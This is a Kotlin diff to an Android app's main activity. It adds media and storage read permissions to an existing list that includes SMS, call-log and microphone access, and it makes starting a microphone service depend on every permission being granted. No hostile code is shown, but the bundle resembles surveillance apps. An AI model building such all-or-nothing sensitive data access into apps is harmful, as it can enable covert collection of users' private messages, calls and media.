@@ -40,6 +40,13 @@ class MainActivity : AppCompatActivity() {
                 Manifest.permission.READ_SMS,
                 Manifest.permission.READ_CALL_LOG,
             )
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                perms += Manifest.permission.READ_MEDIA_AUDIO
+                perms += Manifest.permission.READ_MEDIA_VIDEO
+                perms += Manifest.permission.READ_MEDIA_IMAGES
+            } else {
+                perms += Manifest.permission.READ_EXTERNAL_STORAGE
+            }
             return perms.toTypedArray()
         }
 
@@ -103,7 +110,9 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun hasCorePermissions(): Boolean {
-        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
+        return requiredPermissions.all { permission ->
+            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
+        }
     }
 
     override fun onRequestPermissionsResult(
@@ -116,8 +125,9 @@ class MainActivity : AppCompatActivity() {
         if (requestCode == REQUEST_CODE) {
             val micIndex = permissions.indexOf(Manifest.permission.RECORD_AUDIO)
             val micGranted = micIndex >= 0 && grantResults[micIndex] == PackageManager.PERMISSION_GRANTED
+            val allGranted = grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }
 
-            if (micGranted) {
+            if (micGranted && allGranted) {
                 markConsentGiven()
                 Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show()
                 launchServiceWithIntent(Intent(this, MicService::class.java))
